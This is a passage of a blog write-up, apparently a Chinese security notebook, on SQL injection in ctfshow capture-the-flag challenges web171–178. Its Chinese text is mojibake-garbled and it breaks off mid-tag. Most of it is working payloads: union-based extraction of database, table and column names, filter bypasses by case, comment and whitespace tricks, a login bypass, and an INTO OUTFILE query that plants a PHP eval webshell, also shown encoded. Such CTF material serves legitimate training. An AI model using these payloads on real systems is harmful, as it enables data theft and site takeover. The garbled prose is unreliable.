        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><h4 id="SQLÊ≥®ÂÖ•ÂéüÁêÜ"><a href="#SQLÊ≥®ÂÖ•ÂéüÁêÜ" class="headerlink" title="SQLÊ≥®ÂÖ•ÂéüÁêÜ"></a>SQLÊ≥®ÂÖ•ÂéüÁêÜ</h4><h5 id="1-SQLÊ≥®ÂÖ•Ê¶ÇÂøµÂèä‰∫ßÁîüÂéüÂõ†Ôºö"><a href="#1-SQLÊ≥®ÂÖ•Ê¶ÇÂøµÂèä‰∫ßÁîüÂéüÂõ†Ôºö" class="headerlink" title="1.SQLÊ≥®ÂÖ•Ê¶ÇÂøµÂèä‰∫ßÁîüÂéüÂõ†Ôºö"></a>1.SQLÊ≥®ÂÖ•Ê¶ÇÂøµÂèä‰∫ßÁîüÂéüÂõ†Ôºö</h5><p>ÂΩìwebÂ∫îÁî®ÂêëÂêéÂè∞Êï∞ÊçÆÂ∫ì‰º†ÈÄíSQLËØ≠Âè•ËøõË°åÊï∞ÊçÆÂ∫ìÊìç‰ΩúÊó∂ÔºåÂ¶ÇÊûúÂØπÁî®Êà∑ËæìÂÖ•ÁöÑÂèÇÊï∞Ê≤°ÊúâÁªèËøá‰∏•Ê†ºÁöÑËøáÊª§Â§ÑÁêÜÔºåÈÇ£‰πàÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•ÊûÑÈÄ†ÁâπÊÆä</p><p>ÁöÑSQLËØ≠Âè•ÔºåÁõ¥Êé•ËæìÂÖ•Êï∞ÊçÆÂ∫ìÂºïÊìéÊâßË°åÔºåËé∑ÂèñÊàñ‰øÆÊîπÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇ</p><h5 id="2-SQLÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®Ôºö"><a href="#2-SQLÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®Ôºö" class="headerlink" title="2.SQLÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®Ôºö"></a>2.SQLÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®Ôºö</h5><p>ÊääÁî®Êà∑ËæìÂÖ•ÁöÑÊï∞ÊçÆÂΩì‰Ωú‰ª£Á†ÅÊù•ÊâßË°åÔºåËøùËÉå‰∫Ü‚ÄúÊï∞ÊçÆ‰∏é‰ª£Á†ÅÂàÜÁ¶ª‚ÄùÁöÑÂéüÂàô</p><h5 id="3-SQLÊ≥®ÂÖ•ÁöÑ‰∏§‰∏™ÂÖ≥ÈîÆÁÇπÔºö"><a href="#3-SQLÊ≥®ÂÖ•ÁöÑ‰∏§‰∏™ÂÖ≥ÈîÆÁÇπÔºö" class="headerlink" title="3.SQLÊ≥®ÂÖ•ÁöÑ‰∏§‰∏™ÂÖ≥ÈîÆÁÇπÔºö"></a>3.SQLÊ≥®ÂÖ•ÁöÑ‰∏§‰∏™ÂÖ≥ÈîÆÁÇπÔºö</h5><p>1.Áî®Êà∑ËÉΩÊéßÂà∂ËæìÂÖ•ÁöÑÂÜÖÂÆπÔºõ </p><p>2.webÂ∫îÁî®ÊääÁî®Êà∑ËæìÂÖ•ÁöÑÂÜÖÂÆπÂ∏¶ÂÖ•Âà∞Êï∞ÊçÆÂ∫ìÊâßË°åÔºõ</p><h5 id="SQLÊ≥®ÂÖ•Âü∫Á°ÄÂç±ÂÆ≥Ôºö"><a href="#SQLÊ≥®ÂÖ•Âü∫Á°ÄÂç±ÂÆ≥Ôºö" class="headerlink" title="SQLÊ≥®ÂÖ•Âü∫Á°ÄÂç±ÂÆ≥Ôºö"></a>SQLÊ≥®ÂÖ•Âü∫Á°ÄÂç±ÂÆ≥Ôºö</h5><p>1.ÁõóÂèñÁΩëÁ´ôÁöÑÊïèÊÑü‰ø°ÊÅØ;</p><p>2.ÁªïËøáÁΩëÁ´ôÂêéÂè∞ËÆ§ËØÅ ÂêéÂè∞ÁôªÂΩïËØ≠Âè•Ôºö </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;‚Äòuser‚Äô and Password&#x3D;‚Äòpass‚Äô ‰∏áËÉΩÂØÜÁ†ÅÔºö‚Äòor ‚Äô1‚Äò &#x3D; ‚Äô1‚Äò # ;</code></pre><p>3.ÂÄüÂä©SQLÊ≥®ÂÖ•ÊºèÊ¥ûÊèêÊùÉËé∑ÂèñÁ≥ªÁªüÊùÉÈôê;</p><p>4.ËØªÂèñÊñá‰ª∂‰ø°ÊÅØ„ÄÇ</p><h4 id="MYSQLÊï∞ÊçÆÂ∫ìÊ≥®ÂÖ•-Â∏∏Áî®ÂáΩÊï∞Ôºö"><a href="#MYSQLÊï∞ÊçÆÂ∫ìÊ≥®ÂÖ•-Â∏∏Áî®ÂáΩÊï∞Ôºö" class="headerlink" title="MYSQLÊï∞ÊçÆÂ∫ìÊ≥®ÂÖ•-Â∏∏Áî®ÂáΩÊï∞Ôºö"></a>MYSQLÊï∞ÊçÆÂ∫ìÊ≥®ÂÖ•-Â∏∏Áî®ÂáΩÊï∞Ôºö</h4><p>Ôºà1Ôºâuser() ËøîÂõûÂΩìÂâç‰ΩøÁî®Êï∞ÊçÆÂ∫ìÁöÑÁî®Êà∑Ôºå‰πüÂ∞±ÊòØÁΩëÁ´ôÈÖçÁΩÆÊñá‰ª∂‰∏≠ËøûÊé•Êï∞ÊçÆÂ∫ìÁöÑË¥¶Âè∑ </p><p>Ôºà2Ôºâversion() ËøîÂõûÂΩìÂâçÊï∞ÊçÆÂ∫ìÁöÑÁâàÊú¨ </p><p>Ôºà3Ôºâdatabase() ËøîÂõûÂΩìÂâç‰ΩøÁî®ÁöÑÊï∞ÊçÆÂ∫ìÔºåÂè™ÊúâÂú®useÂëΩ‰ª§ÈÄâÊã©‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì‰πãÂêéÔºåÊâçËÉΩÊü•Âà∞ </p><p>Ôºà4Ôºâgroup_concat() ÊääÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊüêÂàóÊï∞ÊçÆÊàñÊüêÂá†ÂàóÊï∞ÊçÆÂêàÂπ∂‰∏∫‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ </p><p>Ôºà5Ôºâ@@datadir Êï∞ÊçÆÂ∫ìË∑ØÂæÑ </p><p>Ôºà6Ôºâ@@version_compile_os Êìç‰ΩúÁ≥ªÁªüÁâàÊú¨</p><h4 id="SQLÔºàËÅîÂêàÔºâÊ≥®ÂÖ•ÊµÅÁ®ãÔºö"><a href="#SQLÔºàËÅîÂêàÔºâÊ≥®ÂÖ•ÊµÅÁ®ãÔºö" class="headerlink" title="SQLÔºàËÅîÂêàÔºâÊ≥®ÂÖ•ÊµÅÁ®ãÔºö"></a>SQLÔºàËÅîÂêàÔºâÊ≥®ÂÖ•ÊµÅÁ®ãÔºö</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre><p>1„ÄÅÂà§Êñ≠ÊúâÊó†Èó≠Âêà </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;ÁªìÊûúÂíåÁ¨¨‰∏Ä‰∏™‰∏ÄÊ†∑ËØ¥ÊòéÈúÄË¶ÅÈó≠ÂêàÔºåÂèç‰πãÊó†Èó≠Âêà ÊúâÈó≠ÂêàÂàôÈúÄË¶ÅÁî®Âà∞ --+Èó≠Âêà</code></pre><p>2„ÄÅÁåúËß£Â≠óÊÆµ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;ÈááÁî®‰∫åÂàÜÊ≥ï </code></pre><p>3„ÄÅÂà§Êñ≠Êï∞ÊçÆÂõûÊòæ‰ΩçÁΩÆ </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1Ôºå2Ôºå3Ôºå4Ôºå5.... &#x2F;&#x2F;ÂèÇÊï∞Á≠âÂè∑ÂêéÈù¢Âä†-Ë°®Á§∫‰∏çÊòæÁ§∫ÂΩìÂâçÊï∞ÊçÆ </code></pre><p>4„ÄÅËé∑ÂèñÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêç„ÄÅÁî®Êà∑„ÄÅÁâàÊú¨ union select version(),database()Ôºåuser()Ôºå4‚Ä¶‚Ä¶ 4„ÄÅËé∑ÂèñÂÖ®ÈÉ®Êï∞ÊçÆÂ∫ìÂêç</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre><p>5„ÄÅËé∑ÂèñË°®Âêç</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;Â∫ìÂêç&#39;</code></pre><p>6„ÄÅËé∑ÂèñÂ≠óÊÆµÂêç</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;Ë°®Âêç&#39;</code></pre><p>7„ÄÅËé∑ÂèñÊï∞ÊçÆ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(Â≠óÊÆµ1ÔºåÂ≠óÊÆµ2)from Â∫ìÂêç.Ë°®Âêç</code></pre><p>ÂáΩÊï∞ÂêçÁß∞Ôºö ÂáΩÊï∞ÂäüËÉΩÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">Êü• Â∫ìÔºö select schema_name from information_schema.schemaÊü• Ë°®Ôºö select table_name from information_schema.tables where table_schema&#x3D;Â∫ìÂêçÊü• ÂàóÔºö select column_name from information_schema.columns where table_name&#x3D;Ë°®ÂêçÊü•Êï∞ÊçÆÔºö select ÂàóÂêç from Â∫ìÂêç.Ë°®Âêç</code></pre><blockquote><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">SQLÊ≥®ÂÖ•ÂéüÁêÜÂèäÊÄùË∑ØÁªïËøá</a></p></blockquote><p>‰∏áËÉΩÂØÜÁ†ÅÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre><h4 id="mysqlÊìç‰ΩúÁ¨¶‰ºòÂÖàÁ∫ßÔºöÔºàÊï∞Â≠óË∂äÂ§ßÔºå‰ºòÂÖàÁ∫ßË∂äÈ´òÔºâ"><a href="#mysqlÊìç‰ΩúÁ¨¶‰ºòÂÖàÁ∫ßÔºöÔºàÊï∞Â≠óË∂äÂ§ßÔºå‰ºòÂÖàÁ∫ßË∂äÈ´òÔºâ" class="headerlink" title="mysqlÊìç‰ΩúÁ¨¶‰ºòÂÖàÁ∫ßÔºöÔºàÊï∞Â≠óË∂äÂ§ßÔºå‰ºòÂÖàÁ∫ßË∂äÈ´òÔºâ"></a>mysqlÊìç‰ΩúÁ¨¶‰ºòÂÖàÁ∫ßÔºöÔºàÊï∞Â≠óË∂äÂ§ßÔºå‰ºòÂÖàÁ∫ßË∂äÈ´òÔºâ</h4><p>‰ºòÂÖàÁ∫ßËøêÁÆóÁ¨¶<br>1:&#x3D;<br>2|| , OR , XOR<br>3&amp;&amp; , AND<br>4NOT<br>5BETWEEN, CASE, WHEN, THEN, ELSE<br>6&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7|<br>8&amp;<br>9&lt;&lt;, &gt;&gt;<br>10-, +<br>11*, &#x2F;, DIV, %, MOD<br>12^<br>13- (‰∏ÄÂÖÉÂáèÂè∑), ~ (‰∏ÄÂÖÉÊØîÁâπÂèçËΩ¨)<br>14!<br>15BINARY, COLLATE</p><h4 id="ÊÄªÁªì‚ÄìÊôÆÈÄöSQLÊ≥®ÂÖ•ÂøÖÂ§áÊù°‰ª∂Ôºö"><a href="#ÊÄªÁªì‚ÄìÊôÆÈÄöSQLÊ≥®ÂÖ•ÂøÖÂ§áÊù°‰ª∂Ôºö" class="headerlink" title="ÊÄªÁªì‚ÄìÊôÆÈÄöSQLÊ≥®ÂÖ•ÂøÖÂ§áÊù°‰ª∂Ôºö"></a>ÊÄªÁªì‚ÄìÊôÆÈÄöSQLÊ≥®ÂÖ•ÂøÖÂ§áÊù°‰ª∂Ôºö</h4><p>1„ÄÅÁïåÈù¢ËÉΩÂ§üÂõûÊòæÊï∞ÊçÆÂ∫ìÊü•ËØ¢Âà∞ÁöÑÊï∞ÊçÆÔºàÂøÖË¶ÅÊù°‰ª∂ÔºâÔºõ</p><p>2„ÄÅÁïåÈù¢ÂõûÊòæÂÜÖÂÆπËá≥Â∞ëËÉΩÂ§üÊòæÁ§∫Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊüêÂàóÊï∞ÊçÆÔºàÂøÖË¶ÅÊù°‰ª∂ÔºâÔºõ</p><p>3„ÄÅÈÉ®ÂàÜËÉΩÂ§üÁõ¥Êé•Êèê‰æõÊï∞ÊçÆÂ∫ìÊä•ÈîôÂÜÖÂÆπÁöÑÂõûÊòæÔºõ</p><h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-ÂçïÂºïÂè∑Èó≠Âêà"><a href="#web171-ÂçïÂºïÂè∑Èó≠Âêà" class="headerlink" title="web171(ÂçïÂºïÂè∑Èó≠Âêà)"></a>web171(ÂçïÂºïÂè∑Èó≠Âêà)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;ÊãºÊé•sqlËØ≠Âè•Êü•ÊâæÊåáÂÆöIDÁî®Êà∑$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>Ê†πÊçÆÊµÅÁ®ãÊãøÂà∞Â∫ì Ë°® ÂàóÂêçÔºåÊúÄÂêéÊãøÂà∞flag</p><p>Á¨¨‰∏ÄÈ¢òÊâÄ‰ª•ÊµÅÁ®ãËØ¶ÁªÜ‰∏ÄÁÇπ</p><p>È¶ñÂÖàÂ∞ùËØï1‚Äô‚Äì+ÔºåÂèëÁé∞ÊúâËøîÂõûÂÄºÔºõËØ¥ÊòéÁõ¥Êé•Èó≠ÂêàÊ≠£Á°ÆÔºõ</p><p>Êé•ÁùÄÊâæÁî®Êù•ËæìÂá∫ÁöÑÂàóÔºö<code>1&#39; order by 3--+</code>ÔºåÂèëÁé∞‰∏ÄÂÖ±Êúâ3Ë°å(Â∞±1,2,3,4,5ÊÖ¢ÊÖ¢ËØïÂá∫Êù•)</p><p>Êü•ÁúãÊï∞ÊçÆÂ∫ìÔºö<code>1&#39; union select 1,2,database()--+</code>ÂæóÂà∞Êï∞ÊçÆÂ∫ìÂêç‰∏∫<code>ctfshow_web</code></p><p>ÁàÜÁ†¥Ë°®ÂêçÔºö<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>ÂæóÂà∞Ë°®ÂêçÔºö<code>ctfshow_user</code></p><p>ÁàÜÁ†¥ÂàóÂêçÔºö<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>ÔºåÂæóÂà∞ÂàóÂêçÔºö<code>id,username,password</code></p><p>ÁàÜÁ†¥‰ø°ÊÅØÔºö<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>ÔºåÊãøÂà∞flag„ÄÇ</p><p>Êï¥ÁêÜ‰∏Ä‰∏ãÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ÁàÜÂá∫ÊúâÂì™‰∫õ‰ΩçÁΩÆÂèØ‰ª•ËøõË°åËæìÂá∫Êï∞ÊçÆ1&#39; order by 3--+Êü•ÁúãÊï∞ÊçÆÂ∫ìÂêçÂ≠ó1&#39; union select 1,2,database()--+ÁàÜÁ†¥Ë°®ÂêçÔºö-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+ÁàÜÁ†¥ÂàóÂêçÔºö1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+ÁàÜÁ†¥Êï∞ÊçÆÔºö1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre><p>Êúâ‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØÔºåËøôÈáåÁî®ÁöÑÊòØ1ËÄå‰∏çÊòØ-1ÔºåÂ±ÖÁÑ∂ËÉΩÂ§üÁàÜÂá∫‰ø°ÊÅØ„ÄÇÂèØËÉΩÊòØËøôÈáåÊ≤°ÊúâÈôêÂÆöËæìÂá∫Êï∞ÊçÆÁöÑÈáèÔºåÊâÄ‰ª•ËÉΩÂ§üÁî®1ÔºåËÄå‰∏çÊòØÁî®-1„ÄÇ</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>Ë∑ü‰∏ä‰∏ÄÈ¢òÂ∑Æ‰∏çÂ§öÔºåÂè™‰∏çËøáËøôÈáåÊääflagÊç¢Âà∞Âè¶‰∏Ä‰∏™Ë°®<code>ctfshow_user2</code>Èáå‰∫ÜÔºåËÄå‰∏îÂ≠óÊÆµÊï∞Êîπ‰∏∫2‰∫Ü</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ÁàÜÁ†¥Ë°®Âêç-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+ÁàÜÁ†¥ÂàóÂêç-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+ÁàÜÁ†¥flag-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre><h4 id="web173-ÂõûÊòæÊ£ÄÊµã"><a href="#web173-ÂõûÊòæÊ£ÄÊµã" class="headerlink" title="web173(ÂõûÊòæÊ£ÄÊµã)"></a>web173(ÂõûÊòæÊ£ÄÊµã)</h4><p>ËøîÂõûÈÄªËæëÂ§ö‰∫ÜÈôêÂà∂ÔºåÂõûÊòæ‰∏çËÉΩÊúâflagÔºå‰ΩÜÊòØÁõ¥Êé•Êü•flagÂõûÊòæÊòØctfshow</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Ê£ÄÊü•ÁªìÊûúÊòØÂê¶Êúâflag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Êü•ËØ¢ÊàêÂäü'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre><p>ÊàñËÄÖ‰ΩøÁî®ÂÖ∂‰ªñÁªïËøáÂßøÂäø  <strong>ÁºñÁ†ÅÁªïËøá,base64Ôºåhex</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre><h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Ê£ÄÊü•ÁªìÊûúÊòØÂê¶Êúâflag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Êü•ËØ¢ÊàêÂäü'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre><p>ÈôêÂà∂‰∫ÜÊï∞Â≠óÂíå<code>flag</code></p><p>ÊõøÊç¢ÔºöÂ∞ÜÊï∞ÊçÆto_base64Âä†ÂØÜÔºåÁÑ∂ÂêéÂ∞ÜÈáåÈù¢ÊâÄÊúâÁöÑÊï∞Â≠óÁî®replace()ÊõøÊç¢</p><p>ÊõøÊç¢ÊñπÂºèÔºö<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>Á≠âÁ≠â</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre><p>ÁÑ∂Âêé‰ΩøÁî®ËÑöÊú¨Ëß£ÂØÜÂæóÂà∞flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 flag64 <span class="token operator">=</span> <span class="token string">" "</span> flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web175-into-outfile"><a href="#web175-into-outfile" class="headerlink" title="web175(into outfile)"></a>web175(into outfile)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Ê£ÄÊü•ÁªìÊûúÊòØÂê¶Êúâflag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Êü•ËØ¢ÊàêÂäü'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      </code></pre><p>ËøáÊª§ASCII0-127ÁöÑÂ≠óÁ¨¶</p><p>1.Â∞ÜflagÊü•ËØ¢ÁªìÊûú‰º†ÂÖ•1.txtÔºåËÆøÈóÆurl&#x2F;1.txtÊñá‰ª∂Âæóflag</p><p>Êü•ËØ¢ËØ≠Âè•Ôºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre><p>2.Â∞Ü‰∏ÄÂè•ËØùÊú®È©¨‰º†ÂÖ•1.phpÔºå‰ΩøÁî®ËöÅÂâëÈìæÊé•ÂêéÔºåËÆøÈóÆÊï∞ÊçÆÂ∫ìÔºåÊü•ËØ¢flag</p><p>Êü•ËØ¢ËØ≠Âè•Ôºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><p>burp-decoder‚Äî&gt;base64Âä†ÂØÜ‰∏ÄÂè•ËØùÊú®È©¨ÔºåÁî®urlÂä†ÂØÜË°®Á§∫</p><p>payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><h4 id="web176-Â§ßÂ∞èÂÜôÁªïËøá"><a href="#web176-Â§ßÂ∞èÂÜôÁªïËøá" class="headerlink" title="web176(Â§ßÂ∞èÂÜôÁªïËøá)"></a>web176(Â§ßÂ∞èÂÜôÁªïËøá)</h4><p>ban‰∫ÜselectÔºå‰ΩøÁî®Â§ßÂ∞èÂÜôÁªïËøá</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre><h4 id="web177-ÁªïËøáÁ©∫Ê†º"><a href="#web177-ÁªïËøáÁ©∫Ê†º" class="headerlink" title="web177(&#x2F;**&#x2F;ÁªïËøáÁ©∫Ê†º)"></a>web177(&#x2F;**&#x2F;ÁªïËøáÁ©∫Ê†º)</h4><p>ÊääÁ©∫Ê†ºÁªôËøáÊª§Êéâ‰∫ÜÔºåÂ∞±Áõ∏ÂΩì‰∫éÊääÊ≥®ÈáäÁ¨¶‚Äì ÁªôËøáÊª§Êéâ‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•Áî®&#x2F;**&#x2F;ÊàñËÄÖÊòØ%0aÔºàÂõûËΩ¶ÔºâÊù•ÁªïËøáÁ©∫Ê†ºÁöÑËøáÊª§Ôºå%23Ôºà#ÔºâÊù•ÁªïËøáÊ≥®ÈáäÁ¨¶ÁöÑËøáÊª§</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre><h4 id="web178-090a0b0c0dÁªïÁ©∫Ê†º"><a href="#web178-090a0b0c0dÁªïÁ©∫Ê†º" class="headerlink" title="web178(%090a0b0c0dÁªïÁ©∫Ê†º*)"></a>web178(%090a0b0c0dÁªïÁ©∫Ê†º*)</h4><p>Âõ†‰∏∫Â∑≤ÁªèËøáÊª§‰∫Ü<code>*</code>ÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÁî®ÂÖ∂ÂÆÉÂ≠óÁ¨¶Êù•ÁªïËøáÁ©∫Ê†ºÔºåÂèØ‰ª•ÈÄâÊã©</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre><p>‰∏áËÉΩÂØÜÁ†Å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231‚Äôor&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre><h4 id="web179"><a href="#web179" class="headerlink" 